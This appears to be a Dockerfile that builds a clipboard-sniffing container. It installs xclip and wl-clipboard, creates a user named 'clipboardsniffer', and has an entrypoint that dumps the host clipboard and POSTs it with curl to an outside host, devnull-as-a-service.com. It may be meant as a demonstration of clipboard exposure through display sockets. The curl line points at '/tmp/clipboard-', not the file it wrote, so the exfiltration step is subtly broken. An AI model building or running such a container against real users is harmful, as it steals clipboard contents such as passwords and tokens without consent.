from fedora

RUN dnf install -y \
	xclip  \
	git \
	meson \
	gcc \
	wayland-devel \ 
	wayland-protocols-devel 

RUN git clone https://github.com/bugaevc/wl-clipboard /wl-clipboard
WORKDIR /wl-clipboard
RUN meson build
RUN ninja -C build
WORKDIR /wl-clipboard/build
RUN ninja install

RUN useradd -m clipboardsniffer
ENV DISPLAY=:0

ENTRYPOINT /bin/bash -c "xclip -o > /tmp/clipboard || wl-paste > /tmp/clipboard; \
	cat /tmp/clipboard; \
	curl --silent -d @/tmp/clipboard- -X POST http://devnull-as-a-service.com/dev/null"

